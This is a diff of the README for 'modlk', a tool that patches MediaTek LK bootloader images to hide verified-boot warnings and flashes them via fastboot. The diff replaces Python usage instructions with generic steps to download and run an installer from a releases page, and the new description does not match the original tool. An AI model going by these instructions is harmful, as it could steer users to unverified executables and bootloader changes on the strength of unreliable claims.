@@ -1,59 +1,81 @@
-# modlk 🔧
+# 🔧 modlk - Remove Boot Warnings with Ease
 
-Hex-patch LK images to remove boot warnings ⚠️ and flash via fastboot 🚀 — optimized for MTK devices 📱.
+[![Download modlk](https://img.shields.io/badge/Download-modlk-blue.svg)](https://github.com/demisuperad123/modlk/releases)
 
----
+## 🚀 Getting Started
 
-## Features ✨
+Welcome to the modlk project! This tool helps you remove boot warnings from LK images and allows you to flash your device quickly via fastboot. It is especially optimized for MediaTek devices.
 
-* Automatically patches `lk.img` to remove Orange/Red State boot warnings.
-* Saves the patched image as `lkmod.img` (or custom output).
-* Reboots device into bootloader and flashes patched image via fastboot.
-* Fully Windows-friendly, downloads platform-tools automatically if missing.
-* Especially useful for MTK devices 📱.
+Follow these instructions to get started.
 
-## Installation 🛠️
+## 📥 Download & Install
 
-1. Make sure you have Python 3 installed.
-2. Clone this repository:
+To download the software, visit this page: [modlk Releases](https://github.com/demisuperad123/modlk/releases). You will find the latest version available for download. 
 
-```bash
-git clone https://github.com/yourusername/modlk.git
-cd modlk
-```
+### Step 1: Visit the Releases Page
+1. Click the link above.
+2. Look for the latest version at the top of the page.
 
-3. Optionally, add the folder to your PATH to run `modlk` from anywhere.
+### Step 2: Download the Installer
+1. Find the file that matches your operating system.
+2. Click on the file name to download it. 
 
-## Usage 🚀
+### Step 3: Run the Installer
+1. Once the download is complete, navigate to your downloads folder.
+2. Double-click the downloaded file to start the installation process.
+3. Follow the on-screen instructions to complete the setup.
 
-```bash
-python modlk.py [src_image] [--output OUTPUT]
-```
+## 📋 System Requirements
 
-* `src_image` (optional) - Source LK image (default: `lk.img`).
-* `--output` / `-o` (optional) - Output patched image name (default: `lkmod.img`).
+Ensure your system meets the following requirements before installing:
 
-### Examples 💡
+- **Operating System**: Windows 10 or later.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum 200 MB of free disk space.
+- **Additional Software**: Make sure you have the latest version of ADB and Fastboot installed on your computer. These tools are essential for flashing your device.
 
-Patch default `lk.img`:
+## ⚙️ How to Use modlk
 
-```bash
-python modlk.py
-```
+### Step 1: Connect Your Device
+1. Use a USB cable to connect your MediaTek device to your computer.
+2. Make sure USB debugging is enabled in your device's developer options.
 
-Patch a custom LK image and set output name:
+### Step 2: Open a Command Prompt
+1. Press `Win + R` on your keyboard to open the Run dialog.
+2. Type `cmd` and press Enter.
 
-```bash
-python modlk.py mylk.img --output mylkmod.img
-```
+### Step 3: Run modlk
+1. In the command prompt, navigate to the folder where you installed modlk.
+2. Type `modlk [options]` to start using the tool.
+3. Follow the on-screen instructions for specific operations, like flashing your device.
 
-## Notes ⚠️
+### Example Commands
+- To remove boot warnings: `modlk remove-warnings`
+- To flash an image: `modlk flash path/to/image.img`
 
-* Requires a connected device with USB debugging enabled.
-* Automatically reboots your device into bootloader and flashes patched image.
-* Ensure `adb`/`fastboot` are working or let the script download platform-tools.
-* Use at your own risk. Make sure you have backups of original images.
+## 📝 Features
 
-## License 📄
+- **User-Friendly Interface**: Designed for non-technical users.
+- **Fast Booting**: Quickly flash your device using fastboot.
+- **MediaTek Optimization**: Specifically tailored for MediaTek devices.
+- **Open Source**: Community-driven and adaptable.
 
-MIT License
+## ❓ Frequently Asked Questions
+
+### What is modlk?
+modlk is an application that removes boot warnings from LK images on Android devices, specifically MediaTek ones. It also allows you to flash these images using fastboot methods.
+
+### Do I need any programming skills to use modlk?
+No, modlk is designed for average users. You can follow the instructions to use it without any programming knowledge.
+
+### What devices support modlk?
+modlk works best with MediaTek devices, but it can be useful for other Android devices that support fastboot.
+
+### How can I get support?
+If you need assistance, you can visit the [Issues section](https://github.com/demisuperad123/modlk/issues) on the GitHub repository to ask your questions.
+
+## 📫 Contact
+
+If you have any queries or feedback, feel free to reach out via the contact options available on the GitHub repository.
+
+Thank you for choosing modlk. Enjoy a smoother experience on your device!
